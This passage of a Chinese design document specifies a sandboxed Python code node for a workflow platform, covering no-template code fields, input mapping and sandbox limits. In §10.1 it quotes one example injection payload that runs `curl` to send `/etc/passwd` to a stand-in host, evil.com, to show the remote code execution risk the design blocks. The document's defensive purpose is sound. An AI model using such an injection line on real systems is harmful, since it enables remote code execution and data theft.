>   mem/pids/cpus 限额；执行与装包由 api 经 `SANDBOX_URL` 转发（协议见
>   sandbox/service.py）。本地开发保留子进程模式（显式双闸：
>   `CODE_NODE_LOCAL_EXEC=1` 且无 `PGHOST`）；两边都没配时默认拒绝执行
>   （`CODE_SANDBOX_UNCONFIGURED`）。§10.4 清单里 nsjail 一级的
>   rootfs 只读 / setuid 分离 / 系统调用过滤仍属未来。
> - `policy.dryRunnable` 未声明：全仓零消费者，声明了没人读的注解比没有更糟。

现在的数据处理能力只有 `transform.map` / `transform.template` / `list.operation`，
稍微复杂一点的加工（分组统计、多结果集关联、条件汇总）就表达不了，
用户只能想办法在 SQL 里硬凑。代码节点补的是这个洞。

**但它同时是整个系统里唯一一个「按用户输入执行任意代码」的地方，
而 Webhook 让任意人都能触发它。** 所以先讲安全边界，再讲功能。

### 10.1 唯一的红线：代码字段绝不做模板插值

这条如果搞错，就是货真价实的远程代码执行漏洞。

系统里所有文本字段都支持 `{{ $.trigger.x }}` 插值。如果 `code` 字段也支持，
那么：

```python
# 用户写的代码
total = {{ $.trigger.count }}
```

上游 POST `{"count": "0\nimport os; os.system('curl evil.com/$(cat /etc/passwd)')"}`
—— **body 里的内容变成了服务端执行的 Python 代码**。

所以：

> **`code` 字段不参与任何模板解析。数据只能通过 `inputs` 字典传入。**

引擎在 `resolveParams` 时必须显式跳过它。用一个 schema 标记声明，
而不是在引擎里硬编码字段名 —— 跟 `x-placeholders` 是同一个思路
（[types.ts](../src/types.ts) 里那条「哪些字段有自己的占位符语法由 manifest 声明，
不是硬编码」的原则）：

```jsonc
"code": {
  "type": "string",
  "x-no-template": true,     // ← 引擎见到它就原样透传，绝不解析
  "x-ui": { "widget": "code", "language": "python" }
}
```

加一条测试：`code` 字段里写 `{{ $.trigger.x }}` 必须原样进入沙箱，
不能被替换成任何值。**这条测试是防回归的，不是防当下的。**

### 10.2 数据怎么进代码：显式输入映射

抄 Dify 的做法。节点参数分两部分：

```
输入变量（kv 编辑器，值是引用字段）
  rows   ←  {{ $.nodes.sql1.output.rows }}
  days   ←  {{ $.trigger.days }}

代码（不插值）
  def main(inputs):
      rows = inputs["rows"]
      ...
      return {"total": len(rows), "top": rows[:5]}
```

三个好处：

1. **安全**：数据走 JSON 序列化进沙箱，永远不会变成代码。
2. **可复用**：代码里不出现 `$.nodes.sql1`，换个上游节点只改映射不改代码，
   代码可以直接复制到另一条流程。
3. **可静态分析**：编辑器知道这个节点依赖哪些上游，变量面板和校验照常工作。

UI 上「输入变量」那一列用现成的 [RefField](../src/components/RefField.tsx)，
跟别处的引用体验一致。

### 10.3 执行契约

**入口**：固定 `def main(inputs: dict) -> dict`。没有这个函数 → 保存期就报错。

**返回值**：必须是 dict 且 JSON 可序列化。返回 list / 返回对象 / 返回
不可序列化的东西（datetime、numpy 数组）→ 明确报错并指出是哪一类，
**不要静默 `str()` 掉** —— 那样下游拿到的是一串没法用的文本。

（`datetime` 这类可以做一层友好转换：自动转 ISO 串，但要在日志里说明转过。）

**结果怎么传出来**：写到约定的 fd 3 或 `/tmp/__out.json`，
**不解析 stdout**。Dify 靠解析 stdout 拿结果，用户随手 `print()` 一下就把结果搞坏了。
stdout / stderr 全部收集成 `logs` 字段，在运行详情里显示 —— `print` 调试是刚需，
不能因为要拿结果就把它禁掉。

**输出结构**：动态的，靠试运行学习。这套机制**已经有了** ——
`x-dynamic: 'run'` + `probedOutput`（[types.ts](../src/types.ts)），
SQL 节点的列就是这么来的。代码节点直接复用，跑一次之后下游的变量面板里
就能看到 `total` / `top` 这些字段。

固定输出字段：`logs`（stdout，`x-output-ui: { group: 'run' }`）、
`durationMs`。

### 10.4 沙箱

参考实现：

| 方案 | 做法 | 评价 |
|---|---|---|
| **dify-sandbox** | Go + seccomp 白名单系统调用 | 轻量，但只拦系统调用，逃逸面还在 |
| **Windmill** | nsjail（Google 出品的进程隔离） | ✅ 成熟，配置量适中 |
| **n8n Task Runner** | 独立进程 + isolated-vm | JS 专用，不适用 |
| **gVisor / Firecracker** | 用户态内核 / 微 VM | 隔离最强，运维成本对内部工具偏高 |

**推荐：独立 `sandbox` 容器 + 每次执行一个受限子进程（nsjail）。**
不要 per-execution 起容器 —— 冷启动 300ms+，而代码节点大多是毫秒级加工。

硬约束清单，**每条都要有测试**：

| 约束 | 值 | 不做会怎样 |
|---|---|---|
| **网络** | `--network=none` | 代码能直接打内网任意服务，绕过所有审计 |
| **环境变量** | **完全清空**，不继承 | `os.environ` 一读，`OAUTH_*` 机器人凭证全泄 |
| 文件系统 | 只读 rootfs + tmpfs `/tmp` 64MB | 写满磁盘 / 篡改运行时 |
| 用户 | 非 root（uid 65534） | — |
| 内存 | 512MB（cgroup） | 一个 `[0]*10**9` 打爆整机 |
| CPU | 1 core | 死循环拖垮其他运行 |
| 进程数 | pids limit 32 | fork bomb |
| 墙钟超时 | 默认 30s，上限 120s，到点 SIGKILL | 挂死占住 worker |
| 输出大小 | 10MB | 返回巨大对象撑爆 `run_events` 表 |
| 代码长度 | 64KB | — |

**环境变量那条是最容易搞砸的。** 如果代码节点图省事跑在 api 进程里
（`exec()` 一下多快啊），`os.environ` 里就有全部数据平台凭证。
README 里「凭证只有一个来源：机器人账号，绝不接受调用方传入」这条原则，
在有了代码节点之后需要加一句：**也绝不暴露给用户代码**。

### 10.5 联网：不给，且这是设计而非限制

代码里不能发 HTTP 请求。要调外部接口就用 `http.request` 节点。

这不是偷懒，是有意的架构约束：**走 `http.request` 节点，URL、请求头、
认证方式全都在流程定义里可见可审计**，凭证走统一的凭证层；藏在
`requests.post(...)` 里的调用则完全不可见 —— 谁也不知道这条流程往哪发了什么。

预装包只装纯计算的：`pandas`、`numpy`、`python-dateutil`、`orjson`。
版本锁死，在节点说明里列出来。不支持用户自己装包（要装就是另一个需求，
牵扯镜像构建和供应链审查）。

### 10.6 与运行模型的配合

- `runtime.kind: 'http'`（同步）。代码节点是毫秒到秒级，不该走轮询协议。
  超过 `timeoutMs` 由沙箱侧 kill，返回 408。
- `policy.idempotent: true`（纯计算，重试安全）、`dryRunnable: true`。
- 错误分类：语法错误 / 抛异常 / 返回值非法 → **不可重试**（400）；
  沙箱不可用 / OOM 被 kill → 可重试（503）。对应 §3.3 的 `nonRetryable`。
- 错误信息要带**用户代码的行号**，把沙箱包装层的栈帧剥掉 ——
  否则用户看到的是一堆 `runner.py` 的内部调用栈，找不到自己错在哪。

### 10.7 前端

- 代码编辑器：`x-ui.widget: 'code'` 已有，接 CodeMirror 6 + Python 语法高亮，
  Tab 缩进、括号匹配。**不要**用裸 textarea 让人写 Python。
- 新建节点时给默认骨架，不是空白：

  ```python
  def main(inputs):
      # inputs 里是上面「输入变量」配的键
      return {"result": None}
  ```

- 「试运行」按钮复用现有的 `executeSingleNode`（单节点 Test step），
  跑完把输出结构写进 `probedOutput`，下游变量面板立刻能用。
- 输出面板分两块：**返回值**（结构化，可展开）和 **日志**（stdout，等宽字体）。
